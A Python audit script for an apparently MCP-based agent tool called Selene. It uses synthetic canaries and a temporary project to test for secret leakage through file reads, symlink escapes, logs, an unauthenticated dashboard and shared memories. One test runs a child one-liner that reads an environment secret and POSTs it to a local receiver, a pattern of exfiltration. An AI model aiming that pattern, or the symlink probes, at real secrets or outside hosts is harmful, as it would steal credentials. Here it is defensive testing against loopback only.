"""Observe data handling using synthetic canaries, temporary projects, and loopback only."""

import asyncio
import hashlib
import json
import logging
import os
import shlex
import stat
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE = Path(tempfile.mkdtemp(prefix="selene-data-use-"))
os.environ["SELENE_HOME"] = str(BASE / "home")
os.environ["SELENE_AUDIT_FAKE_SECRET"] = "SYNTHETIC_ENVIRONMENT_SECRET_ONLY"

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

from selene.agent import SeleneAgent
from selene.analytics import ToolUsageStats
from selene.config.selene_config import SeleneConfig
from selene.dashboard import SeleneDashboardAPI
from selene.memories.memory_manager import MemoryManager
from selene.util.logging import MemoryLogHandler
from selene.util.shell import execute_shell_command
from solidlsp.util.subprocess_util import subprocess_run


class DataUseAudit:
    SOURCE = "SYNTHETIC_PROJECT_CONTENT_ONLY"
    OUTSIDE = "SYNTHETIC_OUTSIDE_PROJECT_CONTENT_ONLY"
    MEMORY = "SYNTHETIC_MEMORY_CONTENT_ONLY"

    def __init__(self):
        self.output = Path.cwd() / "security" / "data-use-verification.json"
        self.repo = Path.cwd()
        self.project = BASE / "project"
        self.project.mkdir()
        (self.project / ".selene").mkdir()
        (self.project / ".selene" / "project.yml").write_text("project_name: synthetic-audit\nlanguage_servers: []\n")
        (self.project / ".gitignore").write_text(".env\n")
        (self.project / ".env").write_text(self.SOURCE)
        outside = BASE / "outside.txt"
        outside.write_text(self.OUTSIDE)
        (self.project / "linked.txt").symlink_to(outside)
        self.results = {}

    async def mcp(self):
        """Exercise actual stdio requests, including plaintext log persistence."""
        params = StdioServerParameters(
            command=str(self.repo / ".venv/bin/selene"),
            args=[
                "start-mcp-server",
                "--project",
                str(self.project),
                "--enable-web-dashboard",
                "false",
                "--enable-gui-log-window",
                "false",
            ],
            env={**os.environ, "SELENE_HOME": str(BASE / "mcp-home")},
        )
        stderr_path = BASE / "mcp-stderr.log"
        with stderr_path.open("w") as stderr:
            async with stdio_client(params, errlog=stderr) as (read, write):
                async with ClientSession(read, write) as session:
                    init = await session.initialize()
                    tools = await session.list_tools()
                    read_secret = await session.call_tool("read_file", {"relative_path": ".env"})
                    read_outside = await session.call_tool("read_file", {"relative_path": "linked.txt"})
                    direct_outside = await session.call_tool("read_file", {"relative_path": "../outside.txt"})
                    write_memory = await session.call_tool("write_memory", {"memory_name": "sensitive-audit", "content": self.MEMORY})
                    memory_file = self.project / ".selene/memories/sensitive-audit.md"
                    memory_mode = oct(stat.S_IMODE(memory_file.stat().st_mode))
                    await session.call_tool("delete_memory", {"memory_name": "sensitive-audit"})
                    result_text = lambda result: "\n".join(c.text for c in result.content if hasattr(c, "text"))
                    self.results["mcp"] = {
                        "server": init.serverInfo.name,
                        "tools": [tool.name for tool in tools.tools],
                        "ignored_file_returned": self.SOURCE in result_text(read_secret),
                        "outside_project_symlink_returned": self.OUTSIDE in result_text(read_outside),
                        "direct_parent_traversal_blocked": self.OUTSIDE not in result_text(direct_outside),
                        "memory_written": not write_memory.isError,
                        "memory_file_mode": memory_mode,
                        "memory_file_deleted": not memory_file.exists(),
                    }
        logs = list((BASE / "mcp-home/logs").rglob("*.txt"))
        log_text = "\n".join(path.read_text() for path in logs)
        stderr_text = stderr_path.read_text()
        self.results["mcp"].update(
            {
                "source_in_disk_log": self.SOURCE in log_text,
                "outside_source_in_disk_log": self.OUTSIDE in log_text,
                "deleted_memory_still_in_disk_log": self.MEMORY in log_text,
                "source_in_client_stderr": self.SOURCE in stderr_text,
                "memory_input_in_client_stderr": self.MEMORY in stderr_text,
                "log_file_modes": sorted({oct(stat.S_IMODE(path.stat().st_mode)) for path in logs}),
            }
        )

    def local_interfaces(self):
        """Read a dashboard's synthetic data without a token; inspect separate local storage."""
        config = SeleneConfig().with_headless_mode_overrides()
        agent = SeleneAgent(selene_config=config)
        memory_log = MemoryLogHandler()
        memory_log.emit(logging.LogRecord("audit", logging.INFO, __file__, 1, self.SOURCE, (), None))
        memory_log._log_queue.join()
        stats = ToolUsageStats()
        stats.record_tool_usage("read_file", self.SOURCE, self.OUTSIDE)
        api = SeleneDashboardAPI(memory_log, ["read_file"], agent, stats, trusted_hosts=["localhost", "127.0.0.1"])
        client = api._app.test_client()
        response = client.post("/get_log_messages", json={})
        clear = client.post("/clear_logs", json={})
        self.results["dashboard"] = {
            "unauthenticated_log_read_status": response.status_code,
            "synthetic_source_returned_without_token": self.SOURCE in response.get_data(as_text=True),
            "unauthenticated_clear_status": clear.status_code,
            "foreign_host_blocked": client.get("/heartbeat", headers={"Host": "untrusted.invalid"}).status_code == 400,
            "stats_contain_only_counts": self.SOURCE not in json.dumps(stats.get_tool_stats_dict()),
            "scope": "Flask test client: demonstrates lack of authentication, not browser same-origin bypass.",
        }
        agent.on_shutdown()
        memory_log._stop_event.set()
        a = MemoryManager(str(BASE / "project-a-data"))
        b = MemoryManager(str(BASE / "project-b-data"))
        a.save_memory("global/company-a", self.MEMORY, is_tool_context=False)
        shared = b.load_memory("global/company-a")
        target_dir = BASE / "outside-memories"
        target_dir.mkdir()
        (target_dir / "foreign.md").write_text(self.OUTSIDE)
        own_dir = BASE / "project-a-data/memories"
        (own_dir / "link").symlink_to(target_dir, target_is_directory=True)
        self.results["memory_scope"] = {
            "global_memory_visible_from_second_project": shared == self.MEMORY,
            "memory_symlink_reads_outside_directory": a.load_memory("link/foreign") == self.OUTSIDE,
            "scope": "Two managers sharing one temporary Selene home; no real company data.",
        }

    def subprocesses(self):
        """A child posts a fake environment value to a local audit receiver."""
        received = []

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                received.append(self.rfile.read(int(self.headers["Content-Length"])).decode())
                self.send_response(200)
                self.end_headers()

            def log_message(self, format, *args):
                pass

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            code = (
                "import os,urllib.request; "
                f"req=urllib.request.Request('http://127.0.0.1:{server.server_port}/audit',"
                "data=os.environ['SELENE_AUDIT_FAKE_SECRET'].encode(),method='POST'); "
                "urllib.request.build_opener(urllib.request.ProxyHandler({})).open(req).read()"
            )
            result = execute_shell_command(shlex.join([sys.executable, "-c", code]), cwd=str(self.project), capture_stderr=True)
            managed = subprocess_run([sys.executable, "-c", "import os; print(os.environ.get('SELENE_AUDIT_FAKE_SECRET',''))"], check=True)
            self.results["subprocess"] = {
                "shell_exit_code": result.return_code,
                "fake_environment_value_in_managed_child": "SYNTHETIC_ENVIRONMENT_SECRET_ONLY" in managed.stdout,
                "fake_value_received_by_non_mcp_loopback_service": received == ["SYNTHETIC_ENVIRONMENT_SECRET_ONLY"],
                "scope": "Only a synthetic value sent to a loopback receiver owned by this audit. No Internet send attempted. Confirms no application-level MCP-only destination policy.",
            }
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=2)

    def run(self):
        previous_umask = os.umask(0o022)
        try:
            asyncio.run(self.mcp())
            self.local_interfaces()
            self.subprocesses()
        finally:
            os.umask(previous_umask)
        self.results["method"] = {
            "synthetic_only": True,
            "umask": "022",
            "runtime_code_modified": False,
            "external_network_attempted_by_probe": False,
            "temporary_evidence_directory": str(BASE),
            "repository_source_inventory_sha256": hashlib.sha256(
                (self.repo / "security/repository-inventory.json").read_bytes()
            ).hexdigest(),
        }
        self.output.write_text(json.dumps(self.results, indent=2) + "\n")
        print(json.dumps(self.results, indent=2))


if __name__ == "__main__":
    DataUseAudit().run()
